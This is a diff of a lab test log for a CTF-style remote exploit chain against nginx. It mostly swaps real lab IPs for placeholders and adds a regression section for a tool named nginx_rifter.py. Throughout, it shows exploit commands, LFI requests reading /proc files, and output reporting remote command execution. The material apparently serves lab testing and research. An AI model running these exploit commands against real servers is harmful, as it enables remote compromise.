@@ -161,7 +161,7 @@ Status: failed proof. Worker reset did not improve the result.
 
 ## Vagrant ESXi Launch
 
-Purpose: create a real x86_64 Ubuntu lab VM on the `Ultra` ESXi host.
+Purpose: create a real x86_64 Ubuntu lab VM on a lab x86_64 hypervisor.
 
 Commands:
 
@@ -173,26 +173,26 @@ vagrant up --provider=vmware_esxi
 Observed:
 
 ```text
-root@ultra.home SSH key auth works.
+Hypervisor SSH key auth works.
 ovftool still requires ESXi password auth for upload/import.
-VMID: 24
-VM IP: 192.168.1.205
-Direct Vagrant-key SSH to vagrant@192.168.1.205 works.
+VM ID: <vm-id>
+VM IP: <target-host>
+Direct Vagrant-key SSH to vagrant@<target-host> works.
 ```
 
 Status: partial pass. VM creation succeeded; provider guest communication did not complete, so provisioning was completed by rsync plus direct SSH.
 
 ## Vagrant x86_64 Same-Port Smoke Test
 
-Purpose: remove Docker Desktop amd64 emulation from the lab while preserving the x86_64 target architecture.
+Purpose: remove non-native amd64 Docker runtime from the lab while preserving the x86_64 target architecture.
 
 Commands:
 
 ```bash
 vagrant up --provider=vmware_esxi
-curl -sS http://192.168.1.205:19321/
-curl -sS 'http://192.168.1.205:19321/lfi.php?file=/proc/self/status' | sed -n '1,20p'
-curl -sS 'http://192.168.1.205:19321/lfi.php?file=/proc/sys/kernel/randomize_va_space'
+curl -sS http://<target-host>:19321/
+curl -sS 'http://<target-host>:19321/lfi.php?file=/proc/self/status' | sed -n '1,20p'
+curl -sS 'http://<target-host>:19321/lfi.php?file=/proc/sys/kernel/randomize_va_space'
 ```
 
 Observed:
@@ -214,7 +214,7 @@ Purpose: confirm the HTTP-only driver can derive target facts on a real x86_64 U
 Command:
 
 ```bash
-./ctf_remote_exploit.py --host 192.168.1.205 --port 19321 --tries-per-candidate 1 --proof-delay 0.2 --verbose
+./ctf_remote_exploit.py --host <target-host> --port 19321 --tries-per-candidate 1 --proof-delay 0.2 --verbose
 ```
 
 Observed:
@@ -279,7 +279,7 @@ apport disabled
 Command:
 
 ```bash
-./ctf_remote_exploit.py --host 192.168.1.205 --port 19321 --core-guided --tries-per-candidate 2 --proof-delay 0.25 --verbose
+./ctf_remote_exploit.py --host <target-host> --port 19321 --core-guided --tries-per-candidate 2 --proof-delay 0.25 --verbose
 ```
 
 Observed:
@@ -304,8 +304,8 @@ Purpose: use the non-target clone VM to explain why partial-overwrite parameter 
 Setup:
 
 ```text
-debug/twin VM: 192.168.1.89:19321
-target VM:     192.168.1.205:19321
+debug/twin VM: <debug-host>:19321
+target VM:     <target-host>:19321
 gdb:           allowed only on the debug/twin
 ```
 
@@ -360,7 +360,7 @@ Command:
 
 ```bash
 ./ctf_remote_exploit.py \
-  --host 192.168.1.89 --port 19321 \
+  --host <debug-host> --port 19321 \
   --core-guided --target-len 2 \
   --upload-victim --a-count 349 --plus-count 2600 \
   --tries-per-candidate 1 --max-core-hits 20 --verbose
@@ -385,7 +385,7 @@ Command:
 
 ```bash
 ./ctf_remote_exploit.py \
-  --host 192.168.1.89 --port 19321 \
+  --host <debug-host> --port 19321 \
   --core-guided --target-len 2 \
   --upload-victim --delay-victim-body \
   --a-count 128 --plus-count 2800 \
@@ -419,7 +419,7 @@ Command:
 
 ```bash
 ./ctf_remote_exploit.py \
-  --host 192.168.1.205 --port 19321 \
+  --host <target-host> --port 19321 \
   --core-guided --target-len 2 \
   --h2-victim --a-count 127 --plus-count 962 \
   --tries-per-candidate 1 --max-core-hits 100 \
@@ -463,7 +463,7 @@ Command:
 
 ```bash
 ./demo_ctf_exploit_v1_1.py \
-  --host 192.168.1.205 --port 19321 \
+  --host <target-host> --port 19321 \
   --fast --no-color --artifact-dir artifacts
 ```
 
@@ -495,7 +495,7 @@ Command:
 
 ```bash
 ./demo_ctf_exploit_v1_2.py \
-  --host 192.168.1.205 --port 19321 \
+  --host <target-host> --port 19321 \
   --fast --no-color --require-reset-core \
   --artifact-dir artifacts
 ```
@@ -528,7 +528,7 @@ Command:
 
 ```bash
 ./demo_ctf_exploit_v1_3.py \
-  --host 192.168.1.205 --port 19321 \
+  --host <target-host> --port 19321 \
   --fast --no-color --require-reset-core \
   --artifact-dir artifacts
 ```
@@ -558,7 +558,7 @@ Command:
 
 ```bash
 ./demo_ctf_exploit_v1_4.py \
-  --host 192.168.1.205 --port 19321 \
+  --host <target-host> --port 19321 \
   --fast --no-color --require-reset-core \
   --artifact-dir artifacts
 ```
@@ -588,7 +588,7 @@ Command:
 
 ```bash
 ./demo_ctf_exploit_v1_5.py \
-  --host 192.168.1.205 --port 19321 \
+  --host <target-host> --port 19321 \
   --fast --no-color --require-reset-core \
   --rounds 2 --artifact-dir artifacts
 ```
@@ -616,7 +616,7 @@ Command:
 
 ```bash
 ./demo_ctf_exploit_v1_6.py \
-  --host 192.168.1.205 --port 19321 \
+  --host <target-host> --port 19321 \
   --fast --no-color --require-reset-core \
   --negative-test bad-candidate --negative-test-only --expected-fail \
   --no-binary-fingerprint --artifact-dir artifacts
@@ -643,7 +643,7 @@ Command:
 
 ```bash
 ./demo_ctf_exploit_v1_6.py \
-  --host 192.168.1.205 --port 19321 \
+  --host <target-host> --port 19321 \
   --fast --no-color --require-reset-core --rounds 2 \
   --exec-cmd id --cleanup-delay 30 --cleanup-core \
   --artifact-dir artifacts
@@ -685,7 +685,7 @@ Default adapter smoke check:
 python3 - <<'PY'
 from argparse import Namespace
 import demo_ctf_exploit_v1_8 as d
-base = dict(host='192.168.1.205', port=19321, scheme='http', lfi_endpoint='/lfi.php', file_param='file', offset_param='offset', length_param='length', phpinfo_path='/phpinfo.php', timeout=5)
+base = dict(host='<target-host>', port=19321, scheme='http', lfi_endpoint='/lfi.php', file_param='file', offset_param='offset', length_param='length', phpinfo_path='/phpinfo.php', timeout=5)
 for template in (None, 'http://{host}:{port}/lfi.php?file={path_url}{range_query}'):
     args = Namespace(**base, file_read_template=template)
     target = d.make_file_read_target(args)
@@ -704,7 +704,7 @@ Compact-mode exploit command:
 
 ```bash
 ./demo_ctf_exploit_v1_8.py \
-  --host 192.168.1.205 --cmd 'id; uname -a; seq 1 20' \
+  --host <target-host> --cmd 'id; uname -a; seq 1 20' \
   --fast --artifact-dir artifacts
 ```
 
@@ -731,7 +731,7 @@ Template-backed exploit command:
 
 ```bash
 ./demo_ctf_exploit_v1_8.py \
-  --host 192.168.1.205 --cmd id --fast --rounds 1 \
+  --host <target-host> --cmd id --fast --rounds 1 \
   --artifact-dir artifacts \
   --file-read-template 'http://{host}:{port}/lfi.php?file={path_url}{range_query}'
 ```
@@ -756,7 +756,7 @@ Command:
 
 ```bash
 ./demo_ctf_exploit_v1_9.py \
-  --host 192.168.1.205:19321 --cmd 'ls -la /app/tmp' \
+  --host <target-host>:19321 --cmd 'ls -la /app/tmp' \
   --fast --artifact-dir artifacts --phpinfo-path ''
 ```
 
@@ -792,23 +792,23 @@ Purpose: verify `--host` can carry the port and `--port` can be omitted.
 Parser checks:
 
 ```text
---host 192.168.1.205:19321 -> host=192.168.1.205 port=19321
---host 192.168.1.205 --port 19322 -> host=192.168.1.205 port=19322
---host 192.168.1.205:1111 --port 2222 -> parser error
+--host <target-host>:19321 -> host=<target-host> port=19321
+--host <target-host> --port 19322 -> host=<target-host> port=19322
+--host <target-host>:1111 --port 2222 -> parser error
 ```
 
 Live exploit command:
 
 ```bash
 ./demo_ctf_exploit_v1_9.py \
-  --host 192.168.1.205:19321 --cmd id \
+  --host <target-host>:19321 --cmd id \
   --fast --rounds 1 --artifact-dir artifacts --phpinfo-path ''
 ```
 
 Observed:
 
 ```text
-Target: 192.168.1.205:19321
+Target: <target-host>:19321
 [04] Remote command verification setup
 winning address: 0x55e4210b2127
 winning body offset: 1376
@@ -818,7 +818,7 @@ run artifact: artifacts/demo_v1_9_20260515-060834.json
 
 Status: pass.
 
-## nginx_rifter v2 Assessment And Explicit Exploit Handoff
+## nginx_rifter v2 Assessment And Explicit Exploit
 
 Purpose: verify the new assessment-first tool behaves like a real target profiler by default, uses the modular file-read vector, discovers nginx config candidates, and only runs the crashing exploit path when `--exploit` is explicit.
 
@@ -826,7 +826,7 @@ Default assessment command:
 
 ```bash
 ./nginx_rifter.py \
-  --target 192.168.1.205:19321 \
+  --target <target-host>:19321 \
   --artifact-dir artifacts --no-color \
   --output artifacts/nginx_rifter_20260515-v2-final.json
 ```
@@ -852,7 +852,7 @@ Template-backed assessment command:
 
 ```bash
 ./nginx_rifter.py \
-  --target 192.168.1.205:19321 \
+  --target <target-host>:19321 \
   --file-read-template 'http://{host}:{port}/lfi.php?file={path_url}{range_query}' \
   --artifact-dir artifacts --no-color \
   --output artifacts/nginx_rifter_20260515-v2-template.json
@@ -860,11 +860,11 @@ Template-backed assessment command:
 
 Observed: same assessment verdict and vulnerable route candidate using the template adapter.
 
-Explicit exploit handoff command:
+Explicit exploit command:
 
 ```bash
 ./nginx_rifter.py \
-  --target 192.168.1.205:19321 \
+  --target <target-host>:19321 \
   --artifact-dir artifacts --no-color \
   --exploit --cmd id --fast --exploit-rounds 1 --phpinfo-path ''
 ```
@@ -872,7 +872,7 @@ Explicit exploit handoff command:
 Observed:
 
 ```text
-Explicit Exploit Handoff -> demo_ctf_exploit_v1_9.py
+Explicit exploit path -> demo_ctf_exploit_v1_9.py
 CTF WIN: marker token was read back through LFI
 winning address: 0x55e4210b2127
 winning body offset: 1376
@@ -909,3 +909,67 @@ artifacts=2 success=1 negative_pass=1 failed_or_other=0
 ```
 
 Status: pass.
+
+## nginx_rifter Self-Contained Docker Regression
+
+Purpose: verify `nginx_rifter.py` no longer depends on older PoC/demo scripts and still supports assessment, modular file-read templates, integrated exploit derivation, and bounded crash/core parsing without the VM lab.
+
+Commands:
+
+```bash
+python3 -m py_compile nginx_rifter.py
+
+./nginx_rifter.py --target 127.0.0.1:19321 --no-color \
+  --artifact-dir artifacts \
+  --output artifacts/nginx_rifter_selfcontained_docker_assess.json
+
+./nginx_rifter.py --target 127.0.0.1:19321 \
+  --file-read-template 'http://{host}:{port}/lfi.php?file={path_url}{range_query}' \
+  --no-color --artifact-dir artifacts \
+  --output artifacts/nginx_rifter_selfcontained_docker_template.json
+
+./nginx_rifter.py --target 127.0.0.1:19321 --exploit --derive-only \
+  --cmd id --no-color --phpinfo-path '' \
+  --artifact-dir artifacts \
+  --output artifacts/nginx_rifter_selfcontained_docker_derive2.json
+```
+
+Observed:
+
+```text
+HTTP: 200 OK
+HTTP/2 cleartext: yes
+small text read: True
+binary read: True
+ranged reads: True
+worker maps: readable
+system(): 0x7fffff010d70
+rewrite/set candidates: 2
+exploit.status: derive-only
+```
+
+Bounded exploit smoke:
+
+```bash
+docker compose -f env/docker-compose.yml -f env/docker-compose.lfi.yml exec -T nginx rm -f /app/tmp/core
+
+timeout 90 ./nginx_rifter.py --target 127.0.0.1:19321 \
+  --exploit --cmd id --no-color --phpinfo-path '' \
+  --artifact-dir artifacts \
+  --output artifacts/nginx_rifter_selfcontained_docker_exploit_smoke.json \
+  --exploit-rounds 1 --no-auto-calibrate --max-slot-hits 1 \
+  --max-cleanup-pools 1 --max-core-hits 1 --core-delay 1 --cleanup-delay 0
+```
+
+Observed:
+
+```text
+probe crash observed: True
+core load segments: 37
+slot hits: 0 URI-safe / 1 total
+cleanup pools: 1
+probe/corrupt pools: 1
+matched candidates: 0
+```
+
+Status: pass for self-contained regression and bounded crash/core smoke; no marker proof expected from the one-candidate Docker smoke run.
